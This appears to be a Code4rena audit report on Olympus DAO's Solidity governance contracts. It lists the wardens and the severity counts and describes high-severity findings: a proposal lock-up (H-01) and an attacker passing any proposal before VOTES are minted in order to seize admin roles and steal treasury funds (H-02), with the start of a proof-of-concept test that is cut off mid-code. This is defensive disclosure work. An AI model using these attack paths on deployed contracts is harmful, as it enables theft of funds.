{
  "circa": {
    "title": "Olympus DAO contest",
    "sponsor": "Olympus DAO",
    "slug": "2022-08-olympus",
    "date": "2022-10-26",
    "findings": "https://github.com/code-423n4/2022-08-olympus-findings/issues",
    "contest": 156
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit contest outlined in this document, C4 conducted an analysis of the Olympus DAO smart contract system written in Solidity. The audit contest took place between August 25—September 1 2022.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>156 Wardens contributed reports to the Olympus DAO contest:</p>\n<ol>\n<li>zzzitron</li>\n<li>0x52</li>\n<li><a href=\"https://www.linkedin.com/in/or-cyngiser/\">Trust</a></li>\n<li>rbserver</li>\n<li>Lambda</li>\n<li>enckrish</li>\n<li>0x1f8b</li>\n<li>IllIllI</li>\n<li>reassor</li>\n<li>cryptphi</li>\n<li>datapunk</li>\n<li>rvierdiiev</li>\n<li>Bahurum</li>\n<li>minhtrng</li>\n<li>immeas</li>\n<li><a href=\"https://twitter.com/_Czar102\">Czar102</a></li>\n<li><a href=\"https://twitter.com/bin2chen\">bin2chen</a></li>\n<li><a href=\"https://twitter.com/csanuragjain\">csanuragjain</a></li>\n<li>cccz</li>\n<li><a href=\"https://twitter.com/hansfriese\">hansfriese</a></li>\n<li><a href=\"https://jeiwan.net\">Jeiwan</a></li>\n<li><a href=\"https://twitter.com/berndartmueller\">berndartmueller</a></li>\n<li><a href=\"https://twitter.com/itsmeSTYJ\">itsmeSTYJ</a></li>\n<li>brgltd</li>\n<li>d3e4</li>\n<li>djxploit</li>\n<li>V_B (Barichek and vlad_bochok)</li>\n<li><a href=\"https://twitter.com/gallodasballo\">GalloDaSballo</a></li>\n<li>m9800</li>\n<li><a href=\"https://github.com/Aymen1001\">Aymen0909</a></li>\n<li><a href=\"https://twitter.com/0xhyh\">hyh</a></li>\n<li>ladboy233</li>\n<li><a href=\"https://twitter.com/CAA1994\">carlitox477</a></li>\n<li><a href=\"https://twitter.com/0xNazgul\">0xNazgul</a></li>\n<li><a href=\"https://twitter.com/0xruhum\">Ruhum</a></li>\n<li>sorrynotsorry</li>\n<li><a href=\"https://twitter.com/Pedroais2/\">pedroais</a></li>\n<li>pashov</li>\n<li>__141345__</li>\n<li><a href=\"https://twitter.com/CertoraInc\">CertoraInc</a> (egjlmn1, <a href=\"https://twitter.com/ori_dabush\">OriDabush</a>, ItayG, shakedwinder, and RoiEvenHaim)</li>\n<li>tonisives</li>\n<li>0xSky</li>\n<li>PwnPatrol (<a href=\"https://twitter.com/zachobront\">obront</a> and <a href=\"https://twitter.com/Throt7le\">throttle</a>)</li>\n<li>okkothejawa</li>\n<li><a href=\"https://t.me/pfahard\">pfapostol</a></li>\n<li><a href=\"https://twitter.com/c3ph_\">c3phas</a></li>\n<li>yixxas</li>\n<li><a href=\"https://twitter.com/0xSmartContract\">0xSmartContract</a></li>\n<li><a href=\"https://twitter.com/GuardianAudits\">Guardian</a></li>\n<li><a href=\"https://twitter.com/devtooligan\">devtooligan</a></li>\n<li>0xNineDec</li>\n<li>LeoS</li>\n<li><a href=\"https://tom-sol.notion.site/Who-am-I-3b4dc28e77b647eb90794735a94dd38e\">Tomo</a></li>\n<li><a href=\"https://twitter.com/Deivitto\">Deivitto</a></li>\n<li>ReyAdmirado</li>\n<li><a href=\"https://mobile.twitter.com/tomj_bb\">TomJ</a></li>\n<li><a href=\"https://twitter.com/Sm4rty_\">Sm4rty</a></li>\n<li><a href=\"https://www.linkedin.com/in/georgi-nikolaev-georgiev-978253219\">gogo</a></li>\n<li>Rolezn</li>\n<li><a href=\"https://twitter.com/0xheynacho\">ignacio</a></li>\n<li><a href=\"https://twitter.com/ret2basic\">ret2basic</a></li>\n<li><a href=\"https://twitter.com/andyfeili\">oyc_109</a></li>\n<li>ajtra</li>\n<li>0xDjango</li>\n<li>Bnke0x0</li>\n<li><a href=\"https://github.com/grGred\">grGred</a></li>\n<li>robee</li>\n<li>0xkatana</li>\n<li><a href=\"https://twitter.com/father0fBl0cks\">fatherOfBlocks</a></li>\n<li>erictee</li>\n<li>0x040</li>\n<li><a href=\"https://twitter.com/ElKu_crypto\">ElKu</a></li>\n<li>cRat1st0s</li>\n<li><a href=\"https://github.com/lyciumlee\">durianSausage</a></li>\n<li>lukris02</li>\n<li><a href=\"https://github.com/martin-petrov03\">martin</a></li>\n<li><a href=\"https://twitter.com/ROHANJH56009256\">Rohan16</a></li>\n<li>sikorico</li>\n<li>tnevler</li>\n<li>StevenL</li>\n<li>RaymondFam</li>\n<li>Waze</li>\n<li>delfin454000</li>\n<li><a href=\"https://twitter.com/mehmeddukov\">medikko</a></li>\n<li>bobirichman</li>\n<li>CodingNameKiki</li>\n<li><a href=\"https://www.linkedin.com/in/evgeniy-shaldin-21898712a/\">Chandr</a></li>\n<li><a href=\"twitter.com/rokinot\">rokinot</a></li>\n<li>0x85102</li>\n<li><a href=\"https://twitter.com/agfviggiano\">aviggiano</a></li>\n<li>apostle0x01</li>\n<li><a href=\"https://instagram.com/vanensurya\">Funen</a></li>\n<li><a href=\"https://twitter.com/natzuu33\">natzuu</a></li>\n<li>The_GUILD (<a href=\"https://twitter.com/davidpius10\">David_</a>, <a href=\"https://twitter.com/iamephraim_js\">Ephraim</a>, LeoGold, and greatsamist)</li>\n<li><a href=\"https://www.linkedin.com/in/jansen-moreira/?locale=en_US\">JansenC</a></li>\n<li>Diraco</li>\n<li>ne0n</li>\n<li>mics</li>\n<li>ak1</li>\n<li><a href=\"https://twitter.com/shenwilly_\">shenwilly</a></li>\n<li><a href=\"https://t.me/Road220\">m_Rassska</a></li>\n<li>dipp</li>\n<li>DimSon</li>\n<li>nxrblsrpr</li>\n<li><a href=\"https://twitter.com/BipinSah745\">BipinSah</a></li>\n<li><a href=\"https://twitter.com/0xch301\">Ch_301</a></li>\n<li><a href=\"https://twitter.com/prasantgupta52\">prasantgupta52</a></li>\n<li>w0Lfrum</li>\n<li><a href=\"https://twitter.com/rajat_beladiya\">rajatbeladiya</a></li>\n<li><a href=\"https://twitter.com/ch13fd357r0y3r\">ch13fd357r0y3r</a></li>\n<li>PPrieditis</li>\n<li><a href=\"https://chom.dev\">Chom</a></li>\n<li>eierina</li>\n<li>PaludoX0</li>\n<li><a href=\"https://twitter.com/thePicodes\">Picodes</a></li>\n<li>p_crypt0</li>\n<li>Margaret</li>\n<li><a href=\"https://twitter.com/8olidity\">8olidity</a></li>\n<li>EthLedger</li>\n<li><a href=\"https://twitter.com/krenkmet\">indijanc</a></li>\n<li>CRYP70</li>\n<li>cloudjunky</li>\n<li>MasterCookie</li>\n<li><a href=\"https://twitter.com/sm4rtcontr4ct\">JC</a></li>\n<li>exolorkistis</li>\n<li><a href=\"https://zishansami102.github.io/\">zishansami</a></li>\n<li>Dionysus</li>\n<li>ch0bu</li>\n<li>jag</li>\n<li>Noah3o6</li>\n<li>Saintcode_</li>\n<li>chrisdior4</li>\n<li>Amithuddar</li>\n<li>Shishigami</li>\n<li>Metatron</li>\n<li>RoiEvenHaim</li>\n<li>peiw</li>\n<li>karanctf</li>\n<li>kris</li>\n<li>simon135</li>\n<li>Tagir2003</li>\n<li>SooYa</li>\n<li>newfork01</li>\n<li><a href=\"https://twitter.com/fitraldys\">Fitraldys</a></li>\n<li><a href=\"https://twitter.com/BowTiedDravee\">Dravee</a></li>\n<li>Jujic</li>\n<li>peachtea</li>\n</ol>\n<p>This contest was judged by <a href=\"https://github.com/0xean\">0xean</a>.</p>\n<p>Final report assembled by <a href=\"https://twitter.com/liveactionllama\">liveactionllama</a>.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 35 unique vulnerabilities. Of these vulnerabilities, 3 received a risk rating in the category of HIGH severity and 32 received a risk rating in the category of MEDIUM severity.</p>\n<p>Additionally, C4 analysis included 114 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 91 reports recommending gas optimizations.</p>\n<p>All of the issues presented here are linked back to their original finding.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2022-08-olympus\">C4 Olympus DAO contest repository</a>, and is composed of 18 smart contracts written in the Solidity programming language and includes 1,944 lines of Solidity code.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities according to a methodology based on <a href=\"https://owasp.org/www-community/OWASP_Risk_Rating_Methodology\">OWASP standards</a>.</p>\n<p>Vulnerabilities are divided into three primary risk categories: high, medium, and low/non-critical.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>Further information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code4rena.com\">the C4 website</a>.</p>\n<h1 id=\"high-risk-findings-3\" style=\"position:relative;\"><a href=\"#high-risk-findings-3\" aria-label=\"high risk findings 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (3)</h1>\n<h2 id=\"h-01-in-governancesol-it-might-be-impossible-to-activate-a-new-proposal-forever-after-failed-to-execute-the-previous-active-proposal\" style=\"position:relative;\"><a href=\"#h-01-in-governancesol-it-might-be-impossible-to-activate-a-new-proposal-forever-after-failed-to-execute-the-previous-active-proposal\" aria-label=\"h 01 in governancesol it might be impossible to activate a new proposal forever after failed to execute the previous active proposal permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/376\">[H-01] In <code>Governance.sol</code>, it might be impossible to activate a new proposal forever after failed to execute the previous active proposal.</a></h2>\n<p><em>Submitted by hansfriese, also found by berndartmueller, csanuragjain, m9800, V_B, and zzzitron</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L216-L221\">https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L216-L221</a><br>\n<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L302-L304\">https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L302-L304</a></p>\n<p>Currently, if users vote for the active proposal, the <code>VOTES</code> are transferred to the contract so that users can’t vote or endorse other proposals while the voted proposal is active.</p>\n<p>And the active proposal can be replaced only when the proposal is executed successfully or another proposal is activated after <code>GRACE_PERIOD</code>.</p>\n<p>But <code>activateProposal()</code> requires at least 20% endorsements <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L216-L221\">here</a>, so it might be impossible to activate a new proposal forever if the current active proposal involves more than 80% of total votes.</p>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The below scenario would be possible.</p>\n<ol>\n<li><code>Proposal 1</code> was submitted and activated successfully.</li>\n<li>Let’s assume 81% of the total votes voted for this proposal. <code>Yes = 47%</code>, <code>No = 34%</code></li>\n<li>This proposal can’t be executed for <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L268-L270\">this requirement</a> because <code>47% - 34% = 13% &#x3C; 33%</code>.</li>\n<li>Currently the contract contains more than 81% of total votes and users have at most 19% in total.</li>\n<li>Also users can’t reclaim their votes among 81% while <code>Proposal 1</code> is active.</li>\n<li>So even if a user who has 1% votes submits a new proposal, it’s impossible to activate because of this <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L216-L221\">require()</a>.</li>\n<li>So it’s impossible to delete <code>Proposal 1</code> from an active proposal and there won’t be other active proposal forever.</li>\n</ol>\n<h3 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Solidity Visual Developer of VSCode</p>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>I think we should add one more constant like <code>EXECUTION_EXPIRE = 2 weeks</code> so that voters can reclaim their votes after this period even if the proposal is active.</p>\n<p>I am not sure we can use the current <code>GRACE_PERIOD</code> for that purpose.</p>\n<p>So <code>reclaimVotes()</code> should be modified like below.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function reclaimVotes(uint256 proposalId_) external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 userVotes = userVotesForProposal[proposalId_][msg.sender];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (userVotes == 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        revert CannotReclaimZeroVotes();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (proposalId_ == activeProposal.proposalId) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (block.timestamp &lt; activeProposal.activationTimestamp + EXECUTION_EXPIRE) //+++++++++++++++++++++++++++++++++</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            revert CannotReclaimTokensForActiveVote();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (tokenClaimsForProposal[proposalId_][msg.sender] == true) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        revert VotingTokensAlreadyReclaimed();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    tokenClaimsForProposal[proposalId_][msg.sender] = true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    VOTES.transferFrom(address(this), msg.sender, userVotes);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/376\">fullyallocated (Olympus) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-02-anyone-can-pass-any-proposal-alone-before-first-votes-are-minted\" style=\"position:relative;\"><a href=\"#h-02-anyone-can-pass-any-proposal-alone-before-first-votes-are-minted\" aria-label=\"h 02 anyone can pass any proposal alone before first votes are minted permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/392\">[H-02] Anyone can pass any proposal alone before first <code>VOTES</code> are minted</a></h2>\n<p><em>Submitted by Bahurum, also found by bin2chen and cryptphi</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L164\">https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L164</a><br>\n<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L217-L218\">https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L217-L218</a><br>\n<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L268\">https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L268</a></p>\n<p>Before any <code>VOTES</code> are minted anyone can activate and execute an arbitrary proposal even with 0 votes cast. So an attacker can pass any proposal (i.e. change the <code>executor</code> + <code>admin</code> of the <code>Kernel</code>, gaining access to all permissioned functions and to funds held).</p>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Checks on vote numbers made in <code>Governance.sol</code> at lines <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L164\">L164</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L217-218\">217-218</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L268\">268</a> pass if <code>VOTES.totalSupply() == 0</code>. So, until no <code>VOTES</code> are minted, anyone can submit, activate and execute a proposal. There is no need to own or cast votes. This happens if <code>OlympusGovernance</code> is granted the <code>executor</code> role before any <code>VOTES</code> are minted (as in <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/test/policies/Governance.t.sol\">Governance.t.sol</a>). The attacker can anticipate/frontrun the minting and pass a proposal to change both the <code>Kernel</code> <code>admin</code> and <code>executor</code>. Then he/she can upgrade malicious modules, steal funds from treasury…</p>\n<p>A PoC was obtained modifying the <code>setUp()</code> of <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/test/policies/Governance.t.sol\">Governance.t.sol</a> by keeping only what is before the minting of <code>VOTES</code> (up to <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/test/policies/Governance.t.sol#L83\">L83</a> included). The test is as follows:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_AttackerPassesProposalBeforeMinting</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span 